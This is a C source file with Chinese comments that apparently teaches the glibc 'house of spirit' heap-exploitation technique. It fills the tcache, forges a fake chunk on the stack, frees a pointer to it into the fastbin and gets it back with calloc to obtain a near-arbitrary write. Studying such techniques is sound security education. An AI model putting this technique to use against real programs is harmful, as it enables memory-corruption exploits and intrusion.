#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

//这个小案例主要是想通过在栈上构造fake chunk 并构造恶意指针将其free后加入fastbin中，再次malloc后就会拿到栈上的内存地址，对栈空间操作
//在释放victim时，会检查该chunk的下一个chunk的size值是否合法，不然会出现错误(free(): invalid next size (fast)),所以还要设置fake_chunks[9]的值作为下一个chunk的size值
//

int main()
{
	setbuf(stdout, NULL);

	puts("This file demonstrates the house of spirit attack.");
	puts("This attack adds a non-heap pointer into fastbin, thus leading to (nearly) arbitrary write.");
	puts("Required primitives: known target address, ability to set up the start/end of the target memory");

	puts("\nStep 1: Allocate 7 chunks and free them to fill up tcache");
	void *chunks[7];
	for(int i=0; i<7; i++) {
		chunks[i] = malloc(0x30);
	}
	for(int i=0; i<7; i++) {//填满tcachebin大小为0x30的链，使得victim可以释放到fastbin链中
		free(chunks[i]);
	}

	puts("\nStep 2: Prepare the fake chunk");
	// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
	long fake_chunks[10] __attribute__ ((aligned (0x10)));
	
	fake_chunks[1] = 0x40; // this is the size


	fake_chunks[9] = 0x1234; // 设置下一个chunk的size值为一个合理的值

	puts("\nStep 3: Free the first fake chunk");
	puts("Note that the address of the fake chunk must be 16-byte aligned.\n");
	void *victim = &fake_chunks[2];//设置要释放的用户数据指针
	free(victim);

	puts("\nStep 4: Take out the fake chunk");
	printf("Now the next calloc will return our fake chunk at %p!\n", &fake_chunks[2]);
	printf("malloc can do the trick as well, you just need to do it for 8 times.");
	void *allocated = calloc(1, 0x30);//从fastbin分配同样大小的chunk,就会分配构造好的栈空间
	printf("malloc(0x30): %p, fake chunk: %p\n", allocated, victim);

	assert(allocated == victim);
}
